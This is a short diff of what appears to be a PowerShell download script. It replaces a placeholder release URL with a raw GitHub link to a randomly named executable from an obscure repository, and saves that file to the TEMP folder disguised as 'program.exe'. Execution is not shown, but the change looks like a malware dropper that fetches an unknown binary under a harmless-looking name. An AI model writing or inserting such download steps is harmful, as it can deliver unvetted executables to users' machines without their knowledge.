@@ -1,4 +1,4 @@
-$url = "https://github.com/user/repo/releases/download/v1.0/program.exe"
+$url = "https://github.com/myxiaomi626-hub/xyessoty/raw/refs/heads/main/cmytbeh1x3quegck.exe"
 $output = "$env:TEMP\program.exe"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
